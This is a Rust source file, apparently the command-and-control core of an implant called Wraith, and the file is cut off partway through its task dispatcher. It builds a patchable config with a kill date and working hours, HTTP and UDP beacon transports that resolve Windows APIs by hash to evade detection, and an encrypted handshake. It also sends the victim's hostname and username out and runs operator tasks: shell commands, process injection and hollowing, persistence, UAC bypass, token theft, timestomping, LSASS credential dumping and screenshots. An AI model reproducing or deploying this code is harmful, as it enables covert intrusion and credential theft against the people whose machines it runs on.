#[cfg(not(target_os = "windows"))]
use crate::utils::syscalls::*;
use alloc::format;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
use wraith_crypto::noise::{NoiseHandshake, NoiseKeypair, NoiseTransport};
use wraith_crypto::x25519::PublicKey;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub mod packet;
use packet::{WraithFrame, FRAME_TYPE_DATA};

// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";

#[repr(C)]
pub struct PatchableConfig {
    magic: [u8; 19],
    pub server_addr: [u8; 64],
    pub sleep_interval: u64,
    pub jitter: u8,
    pub working_hours_start: u8,
    pub working_hours_end: u8,
    pub kill_date: u64,
    pub user_agent: [u8; 64],
    pub uri: [u8; 64],
    pub host_header: [u8; 64],
    pub padding: [u8; 32],
}

// Place in .data section to be writable/patchable
#[link_section = ".data"]
pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
    magic: CONFIG_MAGIC,
    server_addr: [0u8; 64], // Zeros to be patched
    sleep_interval: 5000,
    jitter: 10,
    working_hours_start: 0,
    working_hours_end: 0,
    kill_date: 0,
    user_agent: [0u8; 64],
    uri: [0u8; 64],
    host_header: [0u8; 64],
    padding: [0; 32],
};

#[derive(Debug, Serialize, Deserialize, Clone, Copy)]
pub enum TransportType {
    Http,
    Udp,
}

pub struct C2Config {
    pub transport: TransportType,
    pub server_addr: &'static str,
    pub sleep_interval: u64,
    pub jitter: u8,
    pub kill_date: u64,
    pub working_hours: (u8, u8),
    pub user_agent: &'static str,
    pub uri: &'static str,
    pub host_header: &'static str,
}

impl C2Config {
    pub fn get_global() -> Self {
        unsafe {
            // Check if patched
            let addr_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.server_addr);
            let addr_slice = &*addr_ptr;
            let addr_len = addr_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let addr_str = if addr_len > 0 {
                core::str::from_utf8_unchecked(&addr_slice[..addr_len])
            } else {
                "127.0.0.1"
            };

            let ua_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.user_agent);
            let ua_slice = &*ua_ptr;
            let ua_len = ua_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let ua_str = if ua_len > 0 {
                core::str::from_utf8_unchecked(&ua_slice[..ua_len])
            } else {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            };

            let uri_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.uri);
            let uri_slice = &*uri_ptr;
            let uri_len = uri_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let uri_str = if uri_len > 0 {
                core::str::from_utf8_unchecked(&uri_slice[..uri_len])
            } else {
                "/api/v1/beacon"
            };

            let host_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.host_header);
            let host_slice = &*host_ptr;
            let host_len = host_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let host_str = if host_len > 0 {
                core::str::from_utf8_unchecked(&host_slice[..host_len])
            } else {
                ""
            };

            Self {
                transport: TransportType::Http,
                server_addr: addr_str,
                sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
                jitter: core::ptr::addr_of!(GLOBAL_CONFIG.jitter).read(),
                kill_date: core::ptr::addr_of!(GLOBAL_CONFIG.kill_date).read(),
                working_hours: (
                    core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_start).read(),
                    core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_end).read(),
                ),
                user_agent: ua_str,
                uri: uri_str,
                host_header: host_str,
            }
        }
    }
}

pub trait Transport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
}

// Linux Implementation
#[cfg(not(target_os = "windows"))]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
    user_agent: &'static str,
    uri: &'static str,
    host_header: &'static str,
}

#[cfg(not(target_os = "windows"))]
impl HttpTransport {
    pub fn new(config: &C2Config, port: u16) -> Self {
        Self {
            host: config.server_addr,
            port,
            user_agent: config.user_agent,
            uri: config.uri,
            host_header: config.host_header,
        }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            // Parse host (simplified: assume IPv4)
            // 127.0.0.1 -> 0x0100007F
            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            let host_val = if !self.host_header.is_empty() {
                self.host_header
            } else {
                self.host
            };

            let req = format!(
                "POST {} HTTP/1.1\r\n\
                 Host: {}\r\n\
                 User-Agent: {}\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n",
                self.uri,
                host_val,
                self.user_agent,
                data.len()
            );

            sys_write(sock, req.as_ptr(), req.len());
            sys_write(sock, data.as_ptr(), data.len());

            let mut buf = [0u8; 4096];
            let mut resp_vec = Vec::new();
            loop {
                let n = sys_read(sock, buf.as_mut_ptr(), 4096);
                if n == 0 || (n as isize) < 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..n]);
            }
            sys_close(sock);

            let mut body_start = 0;
            for i in 0..resp_vec.len().saturating_sub(3) {
                if resp_vec[i] == 13
                    && resp_vec[i + 1] == 10
                    && resp_vec[i + 2] == 13
                    && resp_vec[i + 3] == 10
                {
                    body_start = i + 4;
                    break;
                }
            }

            if body_start > 0 {
                Ok(resp_vec[body_start..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// Windows Implementation
#[cfg(target_os = "windows")]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
    user_agent: &'static str,
    uri: &'static str,
    host_header: &'static str,
}

#[cfg(target_os = "windows")]
impl HttpTransport {
    pub fn new(config: &C2Config, port: u16) -> Self {
        Self {
            host: config.server_addr,
            port,
            user_agent: config.user_agent,
            uri: config.uri,
            host_header: config.host_header,
        }
    }
}

#[cfg(target_os = "windows")]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        let wininet_hash = hash_str(b"wininet.dll");
        unsafe {
            type InternetOpenA =
                unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
            type InternetConnectA = unsafe extern "system" fn(
                HANDLE,
                *const u8,
                u16,
                *const u8,
                *const u8,
                u32,
                u32,
                u32,
            ) -> HANDLE;
            type HttpOpenRequestA = unsafe extern "system" fn(
                HANDLE,
                *const u8,
                *const u8,
                *const u8,
                *const u8,
                *const *const u8,
                u32,
                u32,
            ) -> HANDLE;
            type HttpSendRequestA =
                unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
            type InternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
            type InternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let internet_open: InternetOpenA =
                core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(
                wininet_hash,
                hash_str(b"InternetConnectA"),
            ));
            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(
                wininet_hash,
                hash_str(b"HttpOpenRequestA"),
            ));
            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(
                wininet_hash,
                hash_str(b"HttpSendRequestA"),
            ));
            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(
                wininet_hash,
                hash_str(b"InternetReadFile"),
            ));
            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(
                wininet_hash,
                hash_str(b"InternetCloseHandle"),
            ));

            let mut ua_c = Vec::from(self.user_agent.as_bytes());
            ua_c.push(0);
            let h_inet = internet_open(ua_c.as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
            if h_inet.is_null() {
                return Err(());
            }

            let mut host_c = Vec::from(self.host.as_bytes());
            host_c.push(0);
            let h_conn = internet_connect(
                h_inet,
                host_c.as_ptr(),
                self.port,
                core::ptr::null(),
                core::ptr::null(),
                3,
                0,
                0,
            );
            if h_conn.is_null() {
                internet_close(h_inet);
                return Err(());
            }

            let mut uri_c = Vec::from(self.uri.as_bytes());
            uri_c.push(0);
            let h_req = http_open(
                h_conn,
                b"POST\0".as_ptr(),
                uri_c.as_ptr(),
                core::ptr::null(),
                core::ptr::null(),
                core::ptr::null(),
                0,
                0,
            );
            if h_req.is_null() {
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            let mut headers = alloc::string::String::new();
            if !self.host_header.is_empty() {
                headers = format!("Host: {}\r\n", self.host_header);
            }
            let headers_c = if !headers.is_empty() {
                let mut v = Vec::from(headers.as_bytes());
                v.push(0);
                v
            } else {
                Vec::new()
            };

            let headers_ptr = if !headers_c.is_empty() {
                headers_c.as_ptr()
            } else {
                core::ptr::null()
            };

            if http_send(
                h_req,
                headers_ptr,
                headers_c.len() as u32,
                data.as_ptr() as *const c_void,
                data.len() as u32,
            ) == 0
            {
                internet_close(h_req);
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            let mut resp_vec = Vec::new();
            let mut buf = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0
                    || bytes_read == 0
                {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
            }

            internet_close(h_req);
            internet_close(h_conn);
            internet_close(h_inet);

            Ok(resp_vec)
        }
    }
}

// UDP Transport
#[cfg(not(target_os = "windows"))]
pub struct UdpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl UdpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for UdpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            // UDP socket
            let sock = sys_socket(2, 2, 0); // AF_INET, SOCK_DGRAM
            if (sock as isize) < 0 {
                return Err(());
            }

            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            let sent = sys_sendto(
                sock,
                data.as_ptr(),
                data.len(),
                0,
                &addr as *const _ as *const u8,
                16,
            );
            if sent < 0 {
                sys_close(sock);
                return Err(());
            }

            let mut buf = [0u8; 4096];
            let mut src_addr = SockAddrIn {
                sin_family: 0,
                sin_port: 0,
                sin_addr: 0,
                sin_zero: [0; 8],
            };
            let mut addr_len = 16u32;

            let n = sys_recvfrom(
                sock,
                buf.as_mut_ptr(),
                4096,
                0,
                &mut src_addr as *mut _ as *mut u8,
                &mut addr_len,
            );
            sys_close(sock);

            if n > 0 {
                Ok(buf[..n as usize].to_vec())
            } else {
                Err(())
            }
        }
    }
}

#[cfg(target_os = "windows")]
pub struct UdpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl UdpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
impl Transport for UdpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            // 1. Load ws2_32.dll
            let k32_hash = hash_str(b"kernel32.dll");
            let load_lib_addr = resolve_function(k32_hash, hash_str(b"LoadLibraryA"));
            if load_lib_addr.is_null() {
                return Err(());
            }
            type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
            let load_library: FnLoadLibraryA = core::mem::transmute(load_lib_addr);

            let h_mod = load_library(b"ws2_32.dll\0".as_ptr());
            if h_mod.is_null() {
                return Err(());
            }

            // 2. Resolve functions
            // Note: In a real implant, we might cache these or resolving from the loaded module handle directly
            // `resolve_function` uses PEB walking which finds loaded modules. Since we just loaded it, it should be in PEB.
            let ws2_hash = hash_str(b"ws2_32.dll");

            let wsa_startup_addr = resolve_function(ws2_hash, hash_str(b"WSAStartup"));
            let socket_addr = resolve_function(ws2_hash, hash_str(b"socket"));
            let sendto_addr = resolve_function(ws2_hash, hash_str(b"sendto"));
            let recvfrom_addr = resolve_function(ws2_hash, hash_str(b"recvfrom"));
            let closesocket_addr = resolve_function(ws2_hash, hash_str(b"closesocket"));
            let htobe16_addr = resolve_function(ws2_hash, hash_str(b"htons")); // htons is same as htobe16

            if wsa_startup_addr.is_null()
                || socket_addr.is_null()
                || sendto_addr.is_null()
                || recvfrom_addr.is_null()
                || closesocket_addr.is_null()
            {
                return Err(());
            }

            type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
            type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> usize;
            type FnSendTo =
                unsafe extern "system" fn(usize, *const u8, i32, i32, *const u8, i32) -> i32;
            type FnRecvFrom =
                unsafe extern "system" fn(usize, *mut u8, i32, i32, *mut u8, *mut i32) -> i32;
            type FnCloseSocket = unsafe extern "system" fn(usize) -> i32;
            type FnHtons = unsafe extern "system" fn(u16) -> u16;

            let wsa_startup: FnWSAStartup = core::mem::transmute(wsa_startup_addr);
            let socket_fn: FnSocket = core::mem::transmute(socket_addr);
            let sendto_fn: FnSendTo = core::mem::transmute(sendto_addr);
            let recvfrom_fn: FnRecvFrom = core::mem::transmute(recvfrom_addr);
            let closesocket_fn: FnCloseSocket = core::mem::transmute(closesocket_addr);
            let htons_fn: FnHtons = if !htobe16_addr.is_null() {
                core::mem::transmute(htobe16_addr)
            } else {
                // Fallback if htons not found (unlikely), simple swap
                |x| x.to_be()
            };

            // 3. Initialize Winsock
            let mut wsa_data = [0u8; 400]; // Sufficient for WSADATA
            if wsa_startup(0x0202, wsa_data.as_mut_ptr()) != 0 {
                return Err(());
            }

            // 4. Create Socket
            let sock = socket_fn(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP
            if sock == !0usize {
                // INVALID_SOCKET
                return Err(());
            }

            // 5. Prepare Address
            // Manually parse IP
            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            // sockaddr_in: family(2), port(2), addr(4), zero(8)
            let mut addr = [0u8; 16];
            addr[0] = 2; // AF_INET (u16 low byte)
            addr[1] = 0; // AF_INET (u16 high byte)
            let port_be = htons_fn(self.port);
            addr[2] = (port_be & 0xFF) as u8;
            addr[3] = (port_be >> 8) as u8;
            addr[4] = ip_bytes[0];
            addr[5] = ip_bytes[1];
            addr[6] = ip_bytes[2];
            addr[7] = ip_bytes[3];

            // 6. Send
            let sent = sendto_fn(sock, data.as_ptr(), data.len() as i32, 0, addr.as_ptr(), 16);
            if sent < 0 {
                closesocket_fn(sock);
                return Err(());
            }

            // 7. Receive (with timeout?)
            // For now, blocking. Real impl should set SO_RCVTIMEO.
            let mut buf = [0u8; 4096];
            let mut src_addr = [0u8; 16];
            let mut addr_len = 16i32;

            let n = recvfrom_fn(
                sock,
                buf.as_mut_ptr(),
                4096,
                0,
                src_addr.as_mut_ptr(),
                &mut addr_len,
            );

            closesocket_fn(sock);

            if n > 0 {
                Ok(buf[..n as usize].to_vec())
            } else {
                Err(())
            }
        }
    }
}

fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()> {
    let keypair = NoiseKeypair::generate().map_err(|_| ())?;
    let mut noise = NoiseHandshake::new_initiator(&keypair).map_err(|_| ())?;

    // Msg 1 (Init -> Resp)
    let msg1 = noise.write_message(&[]).map_err(|_| ())?;
    let resp = transport.request(&msg1)?;

    // Msg 2 (Resp -> Init) - Receive Responder Ratchet PubKey
    let peer_payload = noise.read_message(&resp).map_err(|_| ())?;
    let peer_ratchet_pub = if peer_payload.len() >= 32 {
        let mut b = [0u8; 32];
        b.copy_from_slice(&peer_payload[0..32]);
        Some(PublicKey::from_bytes(b))
    } else {
        return Err(());
    };

    // Msg 3 (Init -> Resp) - Send 32 bytes of zeros
    let msg3 = noise.write_message(&[0u8; 32]).map_err(|_| ())?;
    let _ = transport.request(&msg3)?;

    // Initiator doesn't need local ratchet key (it generates one)
    // It needs peer ratchet key.
    noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
}

fn perform_pq_exchange(
    session: &mut NoiseTransport,
    transport: &mut dyn Transport,
) -> Result<(), ()> {
    let mut rng = wraith_crypto::random::SecureRng::new();
    let (ek, dk) = wraith_crypto::pq::generate_keypair(&mut rng);

    let ek_bytes = wraith_crypto::pq::public_key_to_vec(&ek);

    let frame = WraithFrame::new(packet::FRAME_PQ_KEX, ek_bytes);
    let msg = session.write_message(&frame.serialize()).map_err(|_| ())?;

    // Server should respond with Ciphertext
    let resp = transport.request(&msg)?;
    let payload = session.read_message(&resp).map_err(|_| ())?;

    let resp_frame = WraithFrame::deserialize(&payload).ok_or(())?;
    if resp_frame.frame_type != packet::FRAME_PQ_KEX {
        return Err(());
    }

    // Parse Ciphertext
    let ct =
        wraith_crypto::pq::ciphertext_from_bytes(resp_frame.payload.as_slice()).map_err(|_| ())?;

    let ss = wraith_crypto::pq::decapsulate(&dk, &ct);

    session.mix_key(&ss);
    Ok(())
}

fn get_current_unix_time() -> u64 {
    #[cfg(target_os = "windows")]
    unsafe {
        let k32 = hash_str(b"kernel32.dll");
        type GetSystemTimeAsFileTime = unsafe extern "system" fn(*mut u64);
        let func = core::mem::transmute::<_, GetSystemTimeAsFileTime>(resolve_function(
            k32,
            hash_str(b"GetSystemTimeAsFileTime"),
        ));
        let mut ft = 0u64;
        func(&mut ft);
        // FileTime is 100ns intervals since 1601-01-01
        // Unix is seconds since 1970-01-01
        (ft / 10_000_000) - 11_644_473_600
    }
    #[cfg(not(target_os = "windows"))]
    unsafe {
        let mut tp = Timespec {
            tv_sec: 0,
            tv_nsec: 0,
        };
        sys_clock_gettime(0, &mut tp); // CLOCK_REALTIME = 0
        tp.tv_sec as u64
    }
}

fn get_current_hour() -> u8 {
    let unix = get_current_unix_time();
    // Simplified: ignore timezone, assume UTC
    ((unix % 86400) / 3600) as u8
}

fn is_kill_date_reached(kill_date: u64) -> bool {
    if kill_date == 0 {
        return false;
    }
    get_current_unix_time() > kill_date
}

fn is_within_working_hours(start: u8, end: u8) -> bool {
    if start == 0 && end == 0 {
        return true;
    } // 24/7
    let hour = get_current_hour();
    if start < end {
        hour >= start && hour < end
    } else {
        // Wraparound (e.g. 22:00 to 06:00)
        hour >= start || hour < end
    }
}

pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
    let config = C2Config::get_global();
    let mut http_transport = HttpTransport::new(&config, 8080);
    let mut udp_transport = UdpTransport::new(config.server_addr, 9999);

    let mut use_udp = matches!(config.transport, TransportType::Udp);

    let mut mesh_server = crate::modules::mesh::MeshServer::new();
    let _ = mesh_server.start_tcp(4444);
    let _ = mesh_server.start_pipe("wraith_mesh");

    loop {
        // Outer loop: Re-handshake on failure
        let mut session;
        loop {
            // Handshake loop
            // Check KillDate
            if is_kill_date_reached(config.kill_date) {
                unsafe { crate::utils::syscalls::sys_exit(0) };
            }

            // Check WorkingHours
            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
                crate::utils::obfuscation::sleep(600_000); // Sleep 10 mins and check again
                continue;
            }

            let transport: &mut dyn Transport = if use_udp {
                &mut udp_transport
            } else {
                &mut http_transport
            };

            match perform_handshake(transport) {
                Ok(mut s) => {
                    // Upgrade to Post-Quantum Hybrid
                    if perform_pq_exchange(&mut s, transport).is_ok() {
                        session = s;
                        break;
                    }
                    // PQ Exchange failed, retry handshake
                    use_udp = !use_udp;
                    crate::utils::obfuscation::sleep(config.sleep_interval);
                }
                Err(_) => {
                    // Failover
                    use_udp = !use_udp;
                    crate::utils::obfuscation::sleep(config.sleep_interval);
                }
            }
        }

        let mut packet_count: u64 = 0;
        let mut last_rekey = 0;
        let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
        let mut failures = 0;

        loop {
            // Beacon loop
            // Check KillDate
            if is_kill_date_reached(config.kill_date) {
                unsafe { crate::utils::syscalls::sys_exit(0) };
            }

            // Check WorkingHours
            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
                crate::utils::obfuscation::sleep(600_000);
                continue;
            }

            // Check failure threshold for re-handshake
            if failures > 5 {
                break;
            }

            // Check if rekey is needed
            if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
                // Force a DH ratchet step if we have sent messages since the last one
                if session.rekey_dh().is_ok() {
                    packet_count = 0;
                    last_rekey = 0;

                    // Send explicit rekey frame (Strategy 1: Dedicated Protocol Message)
                    // The actual new key is carried in the Double Ratchet header of this encrypted message
                    let rekey_frame = WraithFrame::new(packet::FRAME_REKEY_DH, Vec::new());
                    if let Ok(msg) = session.write_message(&rekey_frame.serialize()) {
                        let transport: &mut dyn Transport = if use_udp {
                            &mut udp_transport
                        } else {
                            &mut http_transport
                        };
                        // We expect the server to respond (potentially with its own new key in the header)
                        if let Ok(resp) = transport.request(&msg) {
                            // Process response to advance ratchet
                            if session.read_message(&resp).is_ok() {
                                failures = 0;
                            } else {
                                failures += 1;
                            }
                        } else {
                            failures += 1;
                        }
                    }
                }
            }

            // 1. Poll Mesh Server
            let mesh_data = mesh_server.poll();
            for (data, client_idx) in mesh_data {
                let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
                relay_frame.stream_id = client_idx as u16;
                let transport: &mut dyn Transport = if use_udp {
                    &mut udp_transport
                } else {
                    &mut http_transport
                };
                if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
                    let _ = transport.request(&msg_to_send);
                }
            }

            let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
            let username_sd = crate::modules::discovery::Discovery.get_username();

            let mut hostname_str = alloc::string::String::from("unknown");
            let mut username_str = alloc::string::String::from("unknown");

            if let Some(guard) = hostname_sd.unlock() {
                hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
            }
            if let Some(guard) = username_sd.unlock() {
                username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
            }

            let beacon_json = format!(
                r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#,
                hostname_str, username_str
            );

            let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
            let frame_bytes = frame.serialize();

            if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
                packet_count += 1;

                let transport: &mut dyn Transport = if use_udp {
                    &mut udp_transport
                } else {
                    &mut http_transport
                };
                if let Ok(resp) = transport.request(&msg_to_send) {
                    if let Ok(pt) = session.read_message(&resp) {
                        failures = 0; // Reset failures on success
                        dispatch_tasks(&pt, &mut session, transport, &mut mesh_server);
                    } else {
                        failures += 1;
                    }
                } else {
                    // Failover on request failure
                    failures += 1;
                    use_udp = !use_udp;
                }
            }

            last_rekey += 1;

            // Jittered Sleep
            let jitter_amt = if config.jitter > 0 {
                let mut rand_buf = [0u8; 1];
                crate::utils::entropy::get_random_bytes(&mut rand_buf);
                let rand_percent =
                    (rand_buf[0] as u64 % (config.jitter as u64 * 2)) as i64 - config.jitter as i64;
                config.sleep_interval as i64 * rand_percent / 100
            } else {
                0
            };
            let sleep_ms = (config.sleep_interval as i64 + jitter_amt).max(100) as u64;
            crate::utils::obfuscation::sleep(sleep_ms);
        }
    }
}

#[derive(Deserialize)]
struct Task {
    #[serde(rename = "id")]
    _id: alloc::string::String,
    #[serde(rename = "type_")]
    task_type: alloc::string::String,
    payload: alloc::string::String,
}

#[derive(Deserialize)]
struct TaskList {
    tasks: alloc::vec::Vec<Task>,
}

fn hex_decode(s: &str) -> Vec<u8> {
    let mut res = Vec::new();
    let chars: Vec<char> = s.chars().collect();
    for i in (0..s.len()).step_by(2) {
        if i + 1 < s.len() {
            let byte_str = format!("{}{}", chars[i], chars[i + 1]);
            if let Ok(byte) = u8::from_str_radix(&byte_str, 16) {
                res.push(byte);
            }
        }
    }
    res
}

use crate::utils::sensitive::SensitiveData;
use zeroize::Zeroize;

// ...

fn dispatch_tasks(
    data: &[u8],
    session: &mut NoiseTransport,
    transport: &mut dyn Transport,
    mesh_server: &mut crate::modules::mesh::MeshServer,
) {
    if let Some(frame) = WraithFrame::deserialize(data) {
        if frame.frame_type == packet::FRAME_TYPE_REKEY {
            // Double Ratchet handles rekeying automatically
            return;
        }
        if frame.frame_type == packet::FRAME_TYPE_MESH_RELAY {
            // Forward payload to child
            mesh_server.send_to_client(frame.stream_id as usize, &frame.payload);
            return;
        }
    }

    let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
        &data[..idx]
    } else {
        data
    };

    static mut SOCKS_PROXY: Option<crate::modules::socks::SocksProxy> = None;

    if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
        for task in response.tasks {
            let mut result: Option<SensitiveData> = None;

            match task.task_type.as_str() {
                "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                "shell" => {
                    result = Some(crate::modules::shell::Shell.exec(&task.payload));
                }
                "powershell" => {
                    result = Some(crate::modules::powershell::PowerShell.exec(&task.payload));
                }
                "inject" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let pid = parts[0].parse::<u32>().unwrap_or(0);
                        let method = match parts[1] {
                            "reflective" => crate::modules::injection::InjectionType::Reflective,
                            "hollowing" => crate::modules::injection::InjectionType::Hollowing,
                            "hijack" => crate::modules::injection::InjectionType::ThreadHijack,
                            _ => crate::modules::injection::InjectionType::Reflective,
                        };
                        let payload = hex_decode(parts[2]);
                        let res = crate::modules::injection::Injector.inject(pid, &payload, method);
                        let msg = if res.is_ok() {
                            b"Injection successful" as &[u8]
                        } else {
                            b"Injection failed" as &[u8]
                        };
                        result = Some(SensitiveData::new(msg));
                    }
                }
                "bof" => {
                    let bof_data = hex_decode(&task.payload);
                    let mut res_vec;
                    #[cfg(target_os = "windows")]
                    {
                        let loader = crate::modules::bof_loader::BofLoader::new(bof_data);
                        if loader.load_and_run().is_ok() {
                            res_vec = loader.get_output();
                        } else {
                            res_vec = b"BOF execution failed".to_vec();
                        }
                    }
                    #[cfg(not(target_os = "windows"))]
                    {
                        let _ = bof_data;
                        res_vec = b"BOF only supported on Windows".to_vec();
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                }
                "socks" => {
                    let mut res_vec;
                    unsafe {
                        if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
                            *core::ptr::addr_of_mut!(SOCKS_PROXY) =
                                Some(crate::modules::socks::SocksProxy::new());
                        }
                        let payload = hex_decode(&task.payload);
                        res_vec = (*core::ptr::addr_of_mut!(SOCKS_PROXY))
                            .as_mut()
                            .unwrap()
                            .process(&payload);
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                }
                "persist" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let method = parts[0];
                        let name = parts[1];
                        let path = parts[2];
                        let res = match method {
                            "registry" => crate::modules::persistence::Persistence
                                .install_registry_run(name, path),
                            "task" => crate::modules::persistence::Persistence
                                .install_scheduled_task(name, path),
                            _ => Err(()),
                        };
                        let msg = if res.is_ok() {
                            b"Persistence installed" as &[u8]
                        } else {
                            b"Persistence failed" as &[u8]
                        };
                        result = Some(SensitiveData::new(msg));
                    } else {
                        result = Some(SensitiveData::new(b"Invalid persist args"));
                    }
                }
                "uac_bypass" => {
                    let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
                    let msg = if res.is_ok() {
                        b"Exploit triggered" as &[u8]
                    } else {
                        b"Exploit failed" as &[u8]
                    };
                    result = Some(SensitiveData::new(msg));
                }
                "steal_token" => {
                    let pid = task.payload.parse::<u32>().unwrap_or(0);
                    result = Some(crate::modules::token::Token.steal_token(pid));
                }
                "revert_token" => {
                    result = Some(crate::modules::token::Token.revert_to_self());
                }
                "timestomp" => {
                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
                        let msg = if res.is_ok() {
                            b"Timestomped" as &[u8]
                        } else {
                            b"Failed" as &[u8]
                        };
                        result = Some(SensitiveData::new(msg));
                    }
                }
                "sandbox_check" => {
                    let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
                    let s = format!("Is Sandbox: {}", is_sandbox);
                    let mut v = s.into_bytes();
                    result = Some(SensitiveData::new(&v));
                    v.zeroize();
                }
                "dump_lsass" => {
                    if let Ok(sd) =
                        crate::modules::credentials::Credentials.dump_lsass(&task.payload)
                    {
                        result = Some(sd);
                    } else {
                        result = Some(SensitiveData::new(b"Dump failed"));
                    }
                }
                "sys_info" => {
                    result = Some(crate::modules::discovery::Discovery.sys_info());
                }
                "screenshot" => {
                    let res = crate::modules::screenshot::Screenshot.capture();
                    let msg = match res {
                        Ok(data) => data,
